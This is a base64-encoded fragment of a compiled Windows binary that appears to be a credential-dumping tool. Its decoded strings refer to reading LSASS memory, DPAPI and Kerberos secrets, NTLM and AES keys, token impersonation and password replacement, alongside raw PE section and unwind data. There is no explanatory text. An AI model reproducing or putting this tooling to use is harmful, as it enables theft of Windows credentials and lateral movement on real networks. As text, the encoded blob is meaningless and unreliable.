gAEQAUABBAFAASQAgAHMAZQByAHYAaQBjAGUACgAAAAAAAAAAAAAAAAAAAAAARQBSAFIATwBSACAAawB1AGgAbABfAG0AXwBzAGUAawB1AHIAbABzAGEAXwBkAHAAYQBwAGkAXwBzAHkAcwB0AGUAbQAgADsAIABEAFAAQQBQAEkAIABzAGUAcgB2AGkAYwBlACAAbgBvAHQAIABpAG4AIABMAFMAQQBTAFMAIABtAGUAbQBvAHIAeQAKAAAARQBSAFIATwBSACAAawB1AGgAbABfAG0AXwBzAGUAawB1AHIAbABzAGEAXwB0AHIAdQBzAHQAIAA7ACAAUABhAHQAdABlAHIAbgAgAG4AbwB0ACAAZgBvAHUAbgBkACAAaQBuACAASwBEAEMAIABzAGUAcgB2AGkAYwBlAAoAAABFAFIAUgBPAFIAIABrAHUAaABsAF8AbQBfAHMAZQBrAHUAcgBsAHMAYQBfAHQAcgB1AHMAdAAgADsAIABLAEQAQwAgAHMAZQByAHYAaQBjAGUAIABuAG8AdAAgAGkAbgAgAEwAUwBBAFMAUwAgAG0AZQBtAG8AcgB5AAoAAAAAAEUAUgBSAE8AUgAgAGsAdQBoAGwAXwBtAF8AcwBlAGsAdQByAGwAcwBhAF8AdAByAHUAcwB0ACAAOwAgAE8AbgBsAHkAIABmAG8AcgAgAD4APQAgADIAMAAwADgAcgAyAAoAAAAAAAAACgAgACAAWwAlAHMAXQAgAAAAAAAAAAAALQA+ACAAJQB3AFoACgAAACUAdwBaACAALQA+AAoAAAAJAGYAcgBvAG0AOgAgAAAACQAqACAAJQBzACAAOgAgAAAAAAAAAAAAAAAAAAAAAABFAFIAUgBPAFIAIABrAHUAaABsAF8AbQBfAHMAZQBrAHUAcgBsAHMAYQBfAGIAawBlAHkAIAA7ACAAUABhAHQAdABlAHIAbgAgAG4AbwB0ACAAZgBvAHUAbgBkACAAaQBuACAARABQAEEAUABJACAAcwBlAHIAdgBpAGMAZQAKAAAAAAAAAAAAaQBtAHAAZQByAHMAbwBuAGEAdABlAAAAcgB1AG4AAAB5AGUAcwAAAG4AbwAAAAAAAAAAAAAAAAB1AHMAZQByAAkAOgAgACUAcwAKAGQAbwBtAGEAaQBuAAkAOgAgACUAcwAKAHAAcgBvAGcAcgBhAG0ACQA6ACAAJQBzAAoAaQBtAHAAZQByAHMALgAJADoAIAAlAHMACgAAAAAAAAAAAEEARQBTADEAMgA4AAkAOgAgAAAAAAAAAEUAUgBSAE8AUgAgAGsAdQBoAGwAXwBtAF8AcwBlAGsAdQByAGwAcwBhAF8AcAB0AGgAIAA7ACAAQQBFAFMAMQAyADgAIABrAGUAeQAgAGwAZQBuAGcAdABoACAAbQB1AHMAdAAgAGIAZQAgADMAMgAgACgAMQA2ACAAYgB5AHQAZQBzACkACgAAAAAAAAAAAEUAUgBSAE8AUgAgAGsAdQBoAGwAXwBtAF8AcwBlAGsAdQByAGwAcwBhAF8AcAB0AGgAIAA7ACAAQQBFAFMAMQAyADgAIABrAGUAeQAgAG8AbgBsAHkAIABzAHUAcABwAG8AcgB0AGUAZAAgAGYAcgBvAG0AIABXAGkAbgBkAG8AdwBzACAAOAAuADEAIAAoAG8AcgAgADcALwA4ACAAdwBpAHQAaAAgAGsAYgAyADgANwAxADkAOQA3ACkACgAAAEEARQBTADIANQA2AAkAOgAgAAAAAAAAAAAAAAAAAAAARQBSAFIATwBSACAAawB1AGgAbABfAG0AXwBzAGUAawB1AHIAbABzAGEAXwBwAHQAaAAgADsAIABBAEUAUwAyADUANgAgAGsAZQB5ACAAbABlAG4AZwB0AGgAIABtAHUAcwB0ACAAYgBlACAANgA0ACAAKAAzADIAIABiAHkAdABlAHMAKQAKAAAAAAAAAAAARQBSAFIATwBSACAAawB1AGgAbABfAG0AXwBzAGUAawB1AHIAbABzAGEAXwBwAHQAaAAgADsAIABBAEUAUwAyADUANgAgAGsAZQB5ACAAbwBuAGwAeQAgAHMAdQBwAHAAbwByAHQAZQBkACAAZgByAG8AbQAgAFcAaQBuAGQAbwB3AHMAIAA4AC4AMQAgACgAbwByACAANwAvADgAIAB3AGkAdABoACAAawBiADIAOAA3ADEAOQA5ADcAKQAKAAAATgBUAEwATQAJADoAIAAAAEUAUgBSAE8AUgAgAGsAdQBoAGwAXwBtAF8AcwBlAGsAdQByAGwAcwBhAF8AcAB0AGgAIAA7ACAAbgB0AGwAbQAgAGgAYQBzAGgALwByAGMANAAgAGsAZQB5ACAAbABlAG4AZwB0AGgAIABtAHUAcwB0ACAAYgBlACAAMwAyACAAKAAxADYAIABiAHkAdABlAHMAKQAKAAAAIAAgAHwAIAAgAFAASQBEACAAIAAlAHUACgAgACAAfAAgACAAVABJAEQAIAAgACUAdQAKAAAAAAAgACAAfAAgACAATABVAEkARAAgACUAdQAgADsAIAAlAHUAIAAoACUAMAA4AHgAOgAlADAAOAB4ACkACgAAAAAAIAAgAFwAXwAgAG0AcwB2ADEAXwAwACAAIAAgAC0AIAAAAAAAAAAAACAAIABcAF8AIABrAGUAcgBiAGUAcgBvAHMAIAAtACAAAAAAAAAAAAAqACoAIABUAG8AawBlAG4AIABJAG0AcABlAHIAcwBvAG4AYQB0AGkAbwBuACAAKgAqAAoAAAAAAAAAAAAAAAAARQBSAFIATwBSACAAawB1AGgAbABfAG0AXwBzAGUAawB1AHIAbABzAGEAXwBwAHQAaAAgADsAIABTAGUAdABUAGgAcgBlAGEAZABUAG8AawBlAG4AIAAoADAAeAAlADAAOAB4ACkACgAAAAAAAAAAAEUAUgBSAE8AUgAgAGsAdQBoAGwAXwBtAF8AcwBlAGsAdQByAGwAcwBhAF8AcAB0AGgAIAA7ACAARAB1AHAAbABpAGMAYQB0AGUAVABvAGsAZQBuAEUAeAAgACgAMAB4ACUAMAA4AHgAKQAKAAAAAABFAFIAUgBPAFIAIABrAHUAaABsAF8AbQBfAHMAZQBrAHUAcgBsAHMAYQBfAHAAdABoACAAOwAgAEcAZQB0AFQAbwBrAGUAbgBJAG4AZgBvAHIAbQBhAHQAaQBvAG4AIAAoADAAeAAlADAAOAB4ACkACgAAAAAAAAAAAAAAAAAAAEUAUgBSAE8AUgAgAGsAdQBoAGwAXwBtAF8AcwBlAGsAdQByAGwAcwBhAF8AcAB0AGgAIAA7ACAATwBwAGUAbgBQAHIAbwBjAGUAcwBzAFQAbwBrAGUAbgAgACgAMAB4ACUAMAA4AHgAKQAKAAAAAABFAFIAUgBPAFIAIABrAHUAaABsAF8AbQBfAHMAZQBrAHUAcgBsAHMAYQBfAHAAdABoACAAOwAgAEMAcgBlAGEAdABlAFAAcgBvAGMAZQBzAHMAVwBpAHQAaABMAG8AZwBvAG4AVwAgACgAMAB4ACUAMAA4AHgAKQAKAAAAAAAAAEUAUgBSAE8AUgAgAGsAdQBoAGwAXwBtAF8AcwBlAGsAdQByAGwAcwBhAF8AcAB0AGgAIAA7ACAATQBpAHMAcwBpAG4AZwAgAGEAdAAgAGwAZQBhAHMAdAAgAG8AbgBlACAAYQByAGcAdQBtAGUAbgB0ACAAOgAgAG4AdABsAG0ALwByAGMANAAgAE8AUgAgAGEAZQBzADEAMgA4ACAATwBSACAAYQBlAHMAMgA1ADYACgAAAAAAAAAAAAAAAAAAAEUAUgBSAE8AUgAgAGsAdQBoAGwAXwBtAF8AcwBlAGsAdQByAGwAcwBhAF8AcAB0AGgAIAA7ACAATQBpAHMAcwBpAG4AZwAgAGEAcgBnAHUAbQBlAG4AdAAgADoAIABkAG8AbQBhAGkAbgAKAAAAAABFAFIAUgBPAFIAIABrAHUAaABsAF8AbQBfAHMAZQBrAHUAcgBsAHMAYQBfAHAAdABoACAAOwAgAE0AaQBzAHMAaQBuAGcAIABhAHIAZwB1AG0AZQBuAHQAIAA6ACAAdQBzAGUAcgAKAAAAAAAAAAAACgAJACAAKgAgAFUAcwBlAHIAbgBhAG0AZQAgADoAIAAlAHcAWgAKAAkAIAAqACAARABvAG0AYQBpAG4AIAAgACAAOgAgACUAdwBaAAAAAAAKAAkAIAAqACAATABNACAAIAAgACAAIAAgACAAOgAgAAAAAAAAAAAACgAJACAAKgAgAE4AVABMAE0AIAAgACAAIAAgADoAIAAAAAAAAAAAAAoACQAgACoAIABTAEgAQQAxACAAIAAgACAAIAA6ACAAAAAAAAAAAAAAAAAAAAAAAAoACQAgACoAIABGAGwAYQBnAHMAIAAgACAAIAA6ACAASQAlADAAMgB4AC8ATgAlADAAMgB4AC8ATAAlADAAMgB4AC8AUwAlADAAMgB4AAAACgAJACAAKgAgAFIAYQB3ACAAZABhAHQAYQAgADoAIAAAAAAAAAAAAAoACQAgACoAIABTAG0AYQByAHQAYwBhAHIAZAAAAAAACgAJACAAIAAgACAAIABQAEkATgAgAGMAbwBkAGUAIAA6ACAAJQB3AFoAAAAAAAAAAAAAAAAAAAAKAAkAIAAgACAAIAAgAEMAYQByAGQAIAAgACAAIAAgADoAIAAlAHMACgAJACAAIAAgACAAIABSAGUAYQBkAGUAcgAgACAAIAA6ACAAJQBzAAoACQAgACAAIAAgACAAQwBvAG4AdABhAGkAbgBlAHIAOgAgACUAcwAKAAkAIAAgACAAIAAgAFAAcgBvAHYAaQBkAGUAcgAgADoAIAAlAHMAAAAAAAAAAAAJACAAIAAgACUAcwAgAAAAPABuAG8AIABzAGkAegBlACwAIABiAHUAZgBmAGUAcgAgAGkAcwAgAGkAbgBjAG8AcgByAGUAYwB0AD4AAAAAACUAdwBaAAkAJQB3AFoACQAAAAAAAAAAAAoACQAgACoAIABVAHMAZQByAG4AYQBtAGUAIAA6ACAAJQB3AFoACgAJACAAKgAgAEQAbwBtAGEAaQBuACAAIAAgADoAIAAlAHcAWgAKAAkAIAAqACAAUABhAHMAcwB3AG8AcgBkACAAOgAgAAAAAABMAFUASQBEACAASwBPAAoAAAAAAAAAAAAKAAkAIAAqACAAUgBvAG8AdABLAGUAeQAgACAAOgAgAAAAAAAAAAAACgAJACAAKgAgAEQAUABBAFAASQAgACAAIAAgADoAIAAAAAAAAAAAAAoACQAgACoAIAAlADAAOAB4ACAAOgAgAAAAAAAAAAAACgAJACAAIAAgACoAIABMAFMAQQAgAEkAcwBvAGwAYQB0AGUAZAAgAEQAYQB0AGEAOgAgACUALgAqAFMAAAAAAAoACQAgACAAIAAgACAAVQBuAGsALQBLAGUAeQAgACAAOgAgAAAAAAAKAAkAIAAgACAAIAAgAEUAbgBjAHIAeQBwAHQAZQBkADoAIAAAAAAACgAJAAkAIAAgACAAUwBTADoAJQB1ACwAIABUAFMAOgAlAHUALAAgAEQAUwA6ACUAdQAAAAAAAAAKAAkACQAgACAAIAAwADoAMAB4ACUAeAAsACAAMQA6ADAAeAAlAHgALAAgADIAOgAwAHgAJQB4ACwAIAAzADoAMAB4ACUAeAAsACAANAA6ADAAeAAlAHgALAAgAEUAOgAAAAAAAAAAACwAIAA1ADoAMAB4ACUAeAAAAAAAAAAAAAoACQAgAFsAJQAwADgAeABdAAAAAAAAAGQAcABhAHAAaQBzAHIAdgAuAGQAbABsAAAAAAAAAAAACQAgAFsAJQAwADgAeABdAAoACQAgACoAIABHAFUASQBEACAAIAAgACAAIAAgADoACQAAAAAAAAAKAAkAIAAqACAAVABpAG0AZQAgACAAIAAgACAAIAA6AAkAAAAAAAAACgAJACAAKgAgAE0AYQBzAHQAZQByAEsAZQB5ACAAOgAJAAAAAAAAAAoACQAgACoAIABzAGgAYQAxACgAawBlAHkAKQAgADoACQAAAAAAAAAKAAkASwBPAAAAAAAAAAAAawBlAHIAYgBlAHIAbwBzAC4AZABsAGwAAAAAAAAAAABUAGkAYwBrAGUAdAAgAEcAcgBhAG4AdABpAG4AZwAgAFMAZQByAHYAaQBjAGUAAABDAGwAaQBlAG4AdAAgAFQAaQBjAGsAZQB0ACAAPwAAAFQAaQBjAGsAZQB0ACAARwByAGEAbgB0AGkAbgBnACAAVABpAGMAawBlAHQAAAAAAAoACQBHAHIAbwB1AHAAIAAlAHUAIAAtACAAJQBzAAAACgAJACAAKgAgAEsAZQB5ACAATABpAHMAdAAgADoACgAAAAAAAAAAAGQAYQB0AGEAIABjAG8AcAB5ACAAQAAgACUAcAAAAAAACgAgACAAIABcAF8AIAAlAHMAIAAAAAAALQA+ACAAAABFAFIAUgBPAFIAIABrAHUAaABsAF8AbQBfAHMAZQBrAHUAcgBsAHMAYQBfAGUAbgB1AG0AXwBrAGUAcgBiAGUAcgBvAHMAXwBjAGEAbABsAGIAYQBjAGsAXwBwAHQAaAAgADsAIABrAHUAbABsAF8AbQBfAG0AZQBtAG8AcgB5AF8AYwBvAHAAeQAgACgAMAB4ACUAMAA4AHgAKQAKAAAACgAgACAAIABcAF8AIAAqAFAAYQBzAHMAdwBvAHIAZAAgAHIAZQBwAGwAYQBjAGUAIAAtAD4AIAAAAAAAAAAAAG4AdQBsAGwAAAAAAAAAAABFAFIAUgBPAFIAIABrAHUAaABsAF8AbQBfAHMAZQBrAHUAcgBsAHMAYQBfAGsAZQByAGIAZQByAG8AcwBfAGUAbgB1AG0AXwB0AGkAYwBrAGUAdABzACAAOwAgAGsAdQBsAGwAXwBtAF8AZgBpAGwAZQBfAHcAcgBpAHQAZQBEAGEAdABhACAAKAAwAHgAJQAwADgAeAApAAoAAAAAAAAACgAJACAAIAAgAEwAUwBBACAAUwBlAHMAcwBpAG8AbgAgAEsAZQB5ACAAIAAgADoAIAAwAHgAJQAwADgAeAAgAC0AIAAlAHMAAAA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CAAoyBjABFAgAFGQKABRUCQAUNAgAFFIQcAEPBgAPZAkADzQIAA9SC3ABEwQAEzQGABMyD3ABFAoAFDQNABQyEPAO4AzQCsAIcAdgBlABCgQACjQIAApSBnABDwYAD1QJAA80CAAPUgtgASMNACN0IgAjZCEAIzQgACMBGgAY8BbgFNASwBBQAAABGQoAGTQWABnSFfAT4BHQD8ANcAxgC1ABHwkAH+Ib8BngF9AVwBNwEmARUBAwAAABGQoAGeQTABl0EgAZZBEAGTQQABnSFfABIwwAI2QZACNUGAAjNBYAI/Ic8BrgGNAWwBRwAQoEAAo0DgAKsgZwASIJACLiG/AZ4BfQFcATcBJgETAQUAAAAR8MAB90FgAfZBUAHzQUAB/SGPAW4BTQEsAQUAEeCgAeNBUAHrIa8BjgFtAUwBJwEWAQUAEVCAAVdA4AFWQNABU0DAAVkhHgARQGABRkDgAUNAwAFJIQcAESCAASVA8AEjQOABJyDuAMcAtgASAMACBkEwAgVBIAIDQRACCSHPAa4BjQFsAUcAEQBgAQZA0AEDQMABCSDHABFQgAFXQIABVkBwAVNAYAFTIR4AEcDAAcZAwAHFQLABw0CgAcMhjwFuAU0BLAEHABGQgAGWQIABlUBwAZNAYAGTIVcAEiCgAidAsAImQKACJUCQAiNAgAIlIe4AEKBAAKNAwACpIGcAEQBgAQZAkAEDQIABBSDHABFAYAFDQRABSyDXAMYAtQAR0GAB00EwAdshZwFWAUUAEMBAAMNAsADHIIcAEGAgAGcgIwAQoEAAo0CQAKUgZwASAMACBkDwAgVA4AIDQMACBSHPAa4BjQFsAUcAEcBQAcYhjgFnAVUBQwAAABHAoAHGQYABw0FwAc8hLgENAOwAxwC1ABHgsAHmQmAB40JAAeAR4AEvAQ4A7ADHALUAAAARUIABV0CQAVZAcAFVQGABUyEeABCAIACJIEMAEmDQAmdEMAJmRCACY0QQAmAToAGPAW4BTQEsAQUAAAAQYCAAYyAjABDAQADDQMAAySCHABHgsAHmQZAB40GAAeARIAEvAQ4A7ADHALUAAAARsJABt0GAAbZBcAGzQWABsBFAAQUAAAARkKABlkEgAZNBEAGZIS8BDgDsAMcAtQARwLABzkHwAcdB4AHGQdABw0HAAcARoAFfAAAAEfCgAfNBgAH/IV8BPgEdAPwA1wDGALUAESBgASdBIAEjQRABLSC1ABIgoAIgEZABbwFOAS0BDADnANYAwwC1ABGQoAGXQLABlkCgAZVAkAGTQIABlSFeABEQYAETQNABFyDXAMYAtQARkKABl0EQAZZBAAGVQPABk0DgAZshXgARUIABV0CgAVZAkAFTQIABVSEeABHQwAHXQPAB1kDgAdVA0AHTQMAB1yGfAX4BXAARwMABxkEAAcVA8AHDQOABxyGPAW4BTQEsAQcAEjDQAjdCEAI2QgACM0HwAjARgAGPAW4BTQEsAQUAAAAQQBAARCAAABGAoAGGQRABhUEAAYNA4AGJIU8BLgEHAJHwkAH2QeAB8BGAAY8BbgFNASwBBwAACMbgIAAQAAAKerAAAjrgAAYCQEACOuAAABBgIABnICUAkMBAAMNA4ADLIIcIxuAgABAAAAqa4AAFivAABgJAQAWK8AAAkXBgAXNBIAF9IT8BFwEGCMbgIAAQAAAM+vAABusQAAYCQEAG6xAAABIw0AI8QdACN0HAAjZBsAIzQaACMBFgAY8BbgFFAAAAEWBAAWUhJwEWAQMAEXCAAXdA8AF2QOABc0DQAXkhBQARQIABRkCQAUVAcAFDQGABQyEHABBwIABwFJAAEEAQAEYgAAAQYCAAaSAjABIAwAIGQNACBUCwAgNAoAIDIc8BrgGNAWwBRwARgIABhkDgAYVA0AGDQMABiSFHABFAgAFGQJABRUCAAUNAcAFDIQcAEZCgAZNA8AGTIV8BPgEdAPwA1wDGALUAEWCgAWNA4AFlIS8BDgDtAMwApwCWAIUAETBgATNBQAE/IJ4AdgBlABHAsAHDQaABwBEgAQ8A7gDNAKwAhwB2AGUAAAASEKACEBGQAV8BPgEdAPwA1wDGALMApQARwLABw0IAAcARgAEPAO4AzQCsAIcAdgBlAAAAEoCwAoNCEAKAEWAB3wG+AZ0BfAFXAUYBNQAAABFAgAFGQOABRUDQAUNAwAFJIQcAEUCAAUZAsAFFQKABQ0CQAUUhBwARIIABJUEAASNA8AEpIO4AxwC2ABFQgAFXQIABVkBwAVNAYAFTIR8AEYCgAYZA8AGFQOABg0DQAYchTwEuAQcAEYCgAYZAwAGFQLABg0CgAYUhTwEuAQcAEOAgAOMgowAQwGAAw0EAAMsghwB2AGUAEcCwAcNB4AHAEWABDwDuAM0ArACHAHYAZQAAABDwYAD2QMAA80CwAPcgtwAQ8GAA80EAAPsghwB2AGUAEPBgAPNBIAD9IIcAdgBlABBAEABIIAAAEsDQAsxFVALHRUQCxkU0AsNFJALAFOQBjwFuAUUAAAAQsGAAtSB+AFcARgA1ACMAENBAANNBAADdIGUAEUBwAUNCoAFAEmAAhwB2AGUAAAARMIABM0FAAT0gzwCuAIcAdgBlABIQoAIQEpABXwE+AR0A/ADXAMYAswClABJg0AJnROACZkTQAmNEwAJgFGABjwFuAU0BLAEFAAAAEaCQAaZBkAGjQYABoBFAAO4AxwC1AAAAEhCgAhNBMAIZIa8BjgFtAUwBJwEWAQUAEMBAAMNAgADFIIcAEeCgAeNBAAHnIa8BjgFtAUwBJwEWAQUAEgCgAgNA4AIFIZ8BfgFdATwBFwEGAPUAEiCgAiASUAFvAU4BLQEMAOcA1gDDALUAETCAATNAwAE1IM4ArACHAHYAZQARIIABJyC/AJ4AfQBXAEYAMwAlABHAoAHDQWABzSFfAT4BHQD8ANcAxgC1ABEwgAEzQPABNSDOAKwAhwB2AGUAEWBgAWZAsAFjQKABZSEnABDgQADjQHAA4yCnABFggAFjQWABbyDPAK4AhwB2AGUAESBgASdAkAEjQIABJSC1ABFwgAF3QKABdkCQAXNAgAF1IQUAEPBgAPNAwAD3IIcAdgBlABGQoAGWQTABk0EgAZshLwEOAOwAxwC1ABIAsAIDQdACABFAAU8BLgENAOwAxwC2AKUAAAARUIABVkDQAVNAsAFVIO4AxwC1ABFwgAF3QRABdkDwAXNA4AF7IQUAEQBgAQZAsAEDQKABByDHABIgwAIsQXACJ0FgAiZBUAIjQUACLyGPAW4BRQARgJABg0HAAYARYADPAKwAhwB2AGUAAAARsJABt0HgAbZB0AGzQcABsBGgAQUAAAARcJABdkFwAXVBUAFzQUABcBEgAQcAAAARQHABQ0HAAUARgACHAHYAZQAAABGgoAGmQRABo0EAAakhPwEeAPwA1wDFABGQoAGWQTABk0EgAZshLwENAOwAxwC1ABGwoAG3QUABtkEwAbNBIAG9IU8BLgEFABGwsAG2QaABtUGQAbNBgAGwEUABTwEuAQcAAAARUIABVkDwAVNA4AFZIO4AxwC1ABHgsAHmQdAB40HAAeARYAEvAQ4A7ADHALUAAAASMLACPEIAAjdB8AIzQeACMBGgAY8BbgFFAAAAEaCQAaZBcAGjQWABoBEgAO4AxwC1AAAAEpCwApNCYAKQEeAB7wHOAa0BjAFnAVYBRQAAABHwsAH3QeAB9kHQAfNBwAHwEYABTgEsAQUAAAAScNACd0LgAnZC0AJzQsACcBJgAc8BrgGNAWwBRQAAABJAkAJHQhACRkIAAkNB4AJAEcABlQAAABGAgAGGQVABg0FAAY8g7gDHALUAEfCwAfNGgAHwFgABDwDuAM0ArACHAHYAZQAAABDwYAD2QNAA80DAAPkgtwAR8MAB90FwAfZBYAHzQVAB/SGPAW4BTQEsAQUAEaCQAaZCkAGjQoABoBJAAO4AxwC1AAAAEcDAAcZBIAHFQRABw0EAAckhjwFuAU0BLAEHABHwsAH3QgAB9kHwAfNB4AHwEaABTwEuAQUAAAARIGABI0FAAS8ghwB2AGUAEMBAAMNBAADNIIcAkXCQAXdEkAF2RIABcBRAAQ8A7gDMAAAIxuAgABAAAAxKwBAA+uAQBgJAQAD64BAAEKBAAKdAIABTQBAAEKAgAKcgYwARcIABdUCwAXNAoAF1IT4BFwEGABFQgAFWQNABU0CgAVUg7gDHALUAEZCgAZNBAAGVIV8BPgEdAPwA1wDGALUAESBgASdA8AEjQOABKyC1ABDQMADQE8AAZwAAABHQoAHQEfABHwD+AN0AvACXAIYAcwBlABCQIACZICUAEhCwAhNCQAIQEcABXwE+AR0A/ADXAMYAtQAAABGgIAGgEVAAEbCQAbdCsAG2QpABs0KAAbASYAEFAAAAEXAQAXogAAARgBABiiAAABGwkAG3QzABs0MgAbAS4AD+ANwAtQAAABHAsAHDQhABwBGAAQ8A7gDNAKwAhwB2AGUAAAAQYCAAbSAjABEggAElQLABI0CgASUg7gDHALYAEJAQAJ4gAAAR4LAB5kHwAeNB4AHgEYABLwEOAOwAxwC1AAAAEQBAAQNBIAEPIGUAERBgAR8gfgBXAEYAMwAlABGQoAGWQVABk0FAAZ0hLwEOAO0AxwC1ABFQgAFWQTABU0EAAVsg7gDHALUAENBAANNAoADXIGUAEfCwAfdCcAH2QmAB8BIAAT8BHgD9ANwAtQAAABHgsAHmQvAB40LgAeASgAEvAQ4A7QDHALUAAAASMNACPEGQAjdBgAI2QXACM0FgAjARIAGPAW4BRQAAABEgUAEnQUABIBEgAGUAAAARUIABVkDgAVNA0AFXIO4AxwC1ABBAEABMIAAAEVCAAVZBQAFTQTABXSDuAMcAtQARwKABxkGAAcNBcAHPIS8BDgDsAMcAtQARMIABNkDgATNA0AE3IP8A3gC3ABGwkAG3QiABtkIQAbNCAAGwEeABBQAAABFAcAFDQaABQBFgAIcAdgBlAAAAESBQASNC4AEgEsAAZQAAABDwMADwEUAARQAAABHAsAHDQuABwBJgAQ8A7gDNAKwAhwB2AGUAAAARcKABc0EQAXchDwDuAM0ArACHAHYAZQARUIABVkFAAVNBMAFdIO8AxwC1ABGwoAG3QQABtkDwAbNA4A